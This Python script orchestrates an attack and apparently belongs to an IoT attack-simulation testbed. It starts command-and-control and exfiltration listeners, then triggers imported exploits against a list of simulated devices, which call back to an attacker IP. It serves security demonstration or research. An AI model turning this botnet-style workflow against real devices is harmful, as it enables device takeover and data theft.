import argparse
import asyncio
import sys
import os
import time

# Add project root to path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from attacker_laptop.attack_orchestrator import start_c2_listener, start_exfil_listener, trigger_exploit

async def main():
    parser = argparse.ArgumentParser(description="Attack 5 - Coordinated Botnet DDoS / Multi-device Attack")
    parser.add_argument("--target", default="localhost", help="Target simulator host (default: localhost)")
    parser.add_argument("--device-ids", required=True, 
                        help="Comma-separated target device IDs to compromise (e.g. SIM-0001,SIM-0007,SIM-0021,SIM-0032)")
    parser.add_argument("--attacker-ip", required=True, help="Local IP of the attacker machine for reverse connections")
    args = parser.parse_args()

    # Start both C2 and Exfiltration listeners
    start_c2_listener()
    start_exfil_listener()

    # Parse device list
    device_list = [d.strip() for d in args.device_ids.split(",") if d.strip()]

    print(f"[*] Starting coordinated attack on devices: {device_list}")
    
    # Trigger exploits sequentially
    for device_id in device_list:
        await trigger_exploit(args.target, device_id, args.attacker_ip, "coordinated")
        await asyncio.sleep(0.5) # Quick pause between triggers

    print("[*] Coordinated attack fully triggered. Keeping listeners active. Press Ctrl+C to terminate.")
    try:
        while True:
            await asyncio.sleep(3600)
    except KeyboardInterrupt:
        print("\n[-] Terminating attacker session.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
